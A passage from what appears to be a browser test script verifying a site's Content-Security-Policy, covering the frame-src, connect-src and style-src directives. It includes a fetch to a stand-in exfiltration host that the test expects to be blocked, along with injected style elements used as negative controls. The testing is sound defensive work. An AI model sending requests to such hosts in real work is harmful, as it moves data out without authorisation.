    ok(framed && !framed.some((v) => /frame/.test(v.d || "") && /challenges\.cloudflare\.com/.test(v.u || "")),
       `frame-src PERMITS the Turnstile iframe — with 'none' the widget mints no token at all (${framed ? JSON.stringify(framed) : gaveUp})`);
    ok(framed && framed.some((v) => /frame/.test(v.d || "") && /^https:\/\/cloudflare\.com/.test(v.u || "")),
       `…while an iframe from the bare cloudflare.com is REFUSED (${framed ? JSON.stringify(framed) : gaveUp})`);

    /* connect-src's one host, both directions: the widget origin is allowed, everyone else
     * still refused. */
    eq(await page.evaluate(() =>
         fetch("https://challenges.cloudflare.com/turnstile/v0/ping", { mode: "cors" })
           .then(() => "sent").catch(() => "blocked")), "sent",
       "connect-src PERMITS the widget's own origin");
    eq(await page.evaluate(() =>
         fetch("https://exfil.invalid.test/x", { mode: "cors" })
           .then(() => "sent").catch(() => "blocked")), "blocked",
       "…and connect-src keeps its teeth for every other host");
    await page.close();
  }


  /* =====================================================================
   * 10. `style-src` — THE LAST HOLE, AND THE MEASURED REASON IT IS STILL OPEN.
   * =================================================================== */
  {
    const csp = H["Content-Security-Policy"] || "";
    const styleSrc = directive("style-src");
    // EXHAUSTIVE, like `connect-src` in block 1: a widening is a diff to this line.
    deep(styleSrc.split(/\s+/).slice(1), ["'self'", "'unsafe-inline'"],
         `style-src is 'self' plus 'unsafe-inline' and nothing else (got ${JSON.stringify(styleSrc)})`);

    /* The strict candidate is DERIVED from the shipped policy (the keyword deleted, nothing
     * retyped), so it is a policy we would actually ship. */
    const STRICT = csp.replace(styleSrc, "style-src 'self'");
    ok(STRICT.includes("style-src 'self';") && !/style-src[^;]*unsafe-inline/.test(STRICT),
       `the derived strict policy is malformed: ${JSON.stringify(STRICT)}`);

    const strictSite = await serveStatic(web, { headers: { ...H, "Content-Security-Policy": STRICT } });
    try {
      const sp = await browser.newPage();
      await sp.setViewport({ width: 1440, height: 900 });
      /* `docs.html` on purpose: it is the ONLY page whose blocker is not ours to delete,
       * and mermaid is already initialised on it by `docs.js`. */
      await sp.goto(`${strictSite.url}/docs.html`, { waitUntil: "domcontentloaded", timeout: 20000 });
      await new Promise((r) => setTimeout(r, 1500));

      const m = await sp.evaluate(async () => {
        const v = [];
        document.addEventListener("securitypolicyviolation", (e) =>
          v.push({ d: e.effectiveDirective || e.violatedDirective, u: e.blockedURI }));
        /* Only style refusals. This page also probes the optional :8081 sidecar, which
         * `connect-src` refuses — counting that would make every number below a lie. */
        const styleV = () => v.filter((x) => /style-src/.test(x.d || "")).length;
        const settle = (ms) => new Promise((r) => setTimeout(r, ms));

        /* --- (a) CSSOM writes (`el.style.transform = …`) are not policed by style-src, which
         * governs <style>, <link rel=stylesheet> and the `style` ATTRIBUTE only. */
        const box = document.createElement("div");
        document.body.appendChild(box);
        /* Quiesce first: docs.js may still be rendering mermaid, whose refusals would be
         * charged to the transform. Wait for 250 ms with no NEW style-src refusal. */
        let last = -1, stable = 0;
        for (let i = 0; i < 400 && stable < 5; i++) {
          await settle(50);
          if (styleV() === last) stable++; else { stable = 0; last = styleV(); }
        }
        const a0 = styleV();
        await new Promise((res) => {
          let n = 0;
          const frame = () => {
            box.style.transform = "translateX(" + (n % 40) + "px) rotate(" + n + "deg)";
            box.style.opacity = "0.6";
            box.style.setProperty("--csp-probe", n + "px");
            if (++n < 20) requestAnimationFrame(frame); else res();
          };
          requestAnimationFrame(frame);
        });
        const cssom = {
          violations: styleV() - a0,
          transform: getComputedStyle(box).transform,
          opacity: getComputedStyle(box).opacity,
          custom: getComputedStyle(box).getPropertyValue("--csp-probe").trim(),
        };

        /* --- (b) NEGATIVE CONTROL — all three shapes style-src polices must be REFUSED. */
        const b0 = styleV();
        const st = document.createElement("style");
        st.textContent = "#csp-neg{outline:9px solid rgb(0,255,0)}";
        (document.head || document.documentElement).appendChild(st);
        const neg = document.createElement("div");
        neg.id = "csp-neg";
        neg.innerHTML = '<span id="csp-neg-attr" style="color:rgb(1,2,3)">x</span>';
        document.body.appendChild(neg);
        neg.setAttribute("style", "color:rgb(4,5,6)");
        await settle(200);
        const refused = {
          violations: styleV() - b0,
          directives: v.filter((x) => /style-src/.test(x.d || "")).map((x) => x.d),
          styleElOutline: getComputedStyle(neg).outlineStyle,
          innerHTMLAttrColor: getComputedStyle(document.getElementById("csp-neg-attr")).color,
          setAttributeColor: getComputedStyle(neg).color,
        };

        /* --- (c) THE ACTUAL BLOCKER: mermaid emits a runtime <style> and `style=` attributes per
         * diagram, assigned via innerHTML — no hash can cover per-diagram bytes. */
        const c0 = styleV();
        let mm;
        try {
          const r = await mermaid.render("csp_style_probe", "graph TD; A[alpha]-->B[beta];");
          const host = document.createElement("div");
          host.innerHTML = r.svg;
          document.body.appendChild(host);
          await settle(200);
          mm = {
            violations: styleV() - c0,
            styleEls: host.querySelectorAll("style").length,
            styleAttrs: host.querySelectorAll("[style]").length,
            rendered: !!host.querySelector("svg"),
          };
        } catch (e) { mm = { error: String((e && e.message) || e) }; }

        return { cssom, refused, mermaid: mm };
      });

      /* ---- (a) the refutation, asserted as a NUMBER ---------------------------- */
      eq(m.cssom.violations, 0,
         "MEASURED: `el.style.transform` on a rAF loop, `.opacity`, and `setProperty` fire ZERO " +
         `style-src violations under 'self' — the CSSOM is not what keeps 'unsafe-inline' here ` +
         `(${JSON.stringify(m.cssom)})`);
      ok(/matrix\(/.test(m.cssom.transform),
         `…and the animated transform still APPLIED (got ${JSON.stringify(m.cssom.transform)})`);
      eq(m.cssom.opacity, "0.6", "…as did the animated opacity");
      ok(m.cssom.custom !== "",
         `…as did a custom property written through \`style.setProperty\` (got ${JSON.stringify(m.cssom.custom)})`);

      /* ---- (b) teeth: the strict policy visibly refuses all three real shapes --- */
      ok(m.refused.violations >= 3,
         "NEGATIVE CONTROL: a strict style-src must REFUSE an injected <style>, an innerHTML " +
         `style= attribute and setAttribute("style") — saw ${m.refused.violations} ` +
         `(${JSON.stringify(m.refused.directives)})`);
      ok(m.refused.directives.some((d) => /style-src-elem/.test(d)),
         `…the <style> ELEMENT refusal is style-src-elem (${JSON.stringify(m.refused.directives)})`);
      ok(m.refused.directives.some((d) => /style-src-attr/.test(d)),
         `…and the ATTRIBUTE refusals are style-src-attr (${JSON.stringify(m.refused.directives)})`);
      eq(m.refused.styleElOutline, "none", "…and the injected <style> did NOT take effect");
      ok(m.refused.innerHTMLAttrColor !== "rgb(1, 2, 3)",
         `…nor did the innerHTML style= attribute (got ${m.refused.innerHTMLAttrColor})`);
      ok(m.refused.setAttributeColor !== "rgb(4, 5, 6)",
         `…nor did setAttribute("style") (got ${m.refused.setAttributeColor})`);

      /* ---- (c) THE INVERTING GUARD — the only assertion here that WANTS a violation. The day
       * mermaid stops emitting runtime styles this reddens; the fix is to drop 'unsafe-inline'
       * from style-src in `sim/web/_headers` and delete this assertion. */
      ok(!m.mermaid.error, `the mermaid probe must run at all (${m.mermaid.error || "ok"})`);
      ok(m.mermaid.styleEls > 0 || m.mermaid.styleAttrs > 0,
         `mermaid still emits runtime styles into its SVG (${JSON.stringify(m.mermaid)})`);
      ok(m.mermaid.violations > 0,
         "THE BLOCKER, STILL REAL: mermaid's generated SVG is refused by a strict style-src " +
         `(${JSON.stringify(m.mermaid)}). IF THIS EVER READS ZERO, the last hole can close — ` +
         "remove 'unsafe-inline' from style-src in sim/web/_headers and delete this check.");
      await sp.close();
    } finally { strictSite.close(); }
  }

} catch (e) {
  fails.push("threw: " + (e && e.stack ? e.stack.split("\n").slice(0, 4).join(" / ") : e));
} finally {
  await browser.close().catch(() => {});
  site.close();
}

finish(LABEL, { fails, count });
